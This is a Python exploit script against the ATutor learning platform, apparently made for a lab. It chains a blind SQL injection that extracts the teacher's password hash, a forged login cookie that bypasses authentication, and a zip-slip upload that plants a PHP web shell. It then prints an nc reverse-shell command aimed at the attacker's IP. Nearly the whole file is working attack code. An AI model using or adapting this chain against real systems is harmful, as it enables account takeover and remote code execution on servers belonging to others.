import sys
sys.path.append('..')
import os

import asyncio
from lib.mysqli_template_async import get_string
from lib.mysqli_template_async import get_length
import hashlib
import requests
from io import BytesIO
import zipfile
import os
import netifaces as ni

from io import BytesIO
try:
    import uvloop
    uvloop.install()
except:
    pass

def build_zip_backdoor(filename:str):
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr(F'../../../../../var/www/html/ATutor/mods/{filename}/{filename}.phtml', "<?php system($_GET['cmd'])?>")
    z.writestr('imsmanifest.xml','invalid xml!')
    z.close()
    zip = open(F'{filename}.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()
def upload_backdoor(session:requests.sessions.Session, filename:str):
    proxies = {'http':'http://192.168.177.1:8080/'}
    build_zip_backdoor(filename=filename)
    full_filename = F'{filename}.zip'
    fileobj = open(F'./{full_filename}','rb')
    # Absolutely crucial to exploit working. We must be in a valid course in order to upload, uploads are specific to each course
    res = session.get("http://atutor/ATutor/bounce.php?course=16777215")
    print("(+) Cookies: ", session.cookies.get_dict())
    res = session.post(
        url='http://atutor/ATutor/mods/_standard/tests/import_test.php',
        files={
            "file":(full_filename,fileobj, 'application/x-zip-compressed'),
            },
        data={"submit_import": "Import"},
    )
    #print(res.status_code)
    backdoor_url = F"http://atutor/ATutor/mods/{filename}/{filename}.phtml"
    res = requests.get(backdoor_url)
    if (res.status_code == 200):
        print("(+) Backdoor Upload successfull")
        print(F"(+) Backdoor can be found at: {backdoor_url}")
        attacker_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        print(F"(+) Reverse shell => curl {backdoor_url}?cmd=nc%20-e%20%2Fbin%2Fbash%20{attacker_ip}%204444")
    else:
        print("(+) Backdoor Upload Failed")
    os.remove(F'./{full_filename}')
async def main():
    blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
    url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
    conditional_error = lambda response: int(response.headers['Content-Length']) == 180
    query_encoder = lambda s: s.replace(' ','/**/')
    
    teacher_hash_query = "select password from AT_members where login='teacher'"
    teacher_last_logon_query = "select last_login from AT_members where login='teacher'"
    
    hash_len = await get_length(url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, query_encoder=query_encoder)
    teacher_hash = await  get_string(url=url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
    print(F"(+) Recovered teacher hash: {teacher_hash}")

    hash_len = await get_length(url, base_query=blind_sqli_truthy, sub_query=teacher_last_logon_query, response_truth_condition=conditional_error, query_encoder=query_encoder)
    teacher_last_logon = await  get_string(url=url, base_query=blind_sqli_truthy, sub_query=teacher_last_logon_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
    print(F"(+) Recovered last logon: {teacher_last_logon}")
    cookie_user="teacher"
    # this is the salted hash that is computed by the application. that the ATPass cookie is checked against!
    cookie_pass = hashlib.sha512(str(teacher_hash + hashlib.sha512(str(teacher_last_logon).encode('utf-8')).hexdigest()).encode('utf-8')).hexdigest()
    print(F"(+) SHA512 Hash {cookie_pass}")
    url = "http://atutor/ATutor/login.php"
    data = {'form_login_action': 'true', 'form_course_id':'0'}
    cookies = {'ATLogin': cookie_user, 'ATPass': cookie_pass}
    session = requests.Session()
    proxies = {'http':'http://192.168.177.1:8080/'}

    #res = session.post(url,data=data,cookies=cookies, proxies=proxies)
    res = session.post(url,data=data,cookies=cookies)

    if ('Log-out' in res.text):
        print('(+) PTH VIA Cookie Success!')
    else:
        print('(+) PTH VIA Cookie Failure!')
        print(res.status_code)
    upload_backdoor(session=session,filename="cornbread")   


if __name__ == "__main__":
    try:
        asyncio.run(main())
    # https://github.com/MagicStack/uvloop/issues/349
    except NotImplementedError:
        pass
'''

'''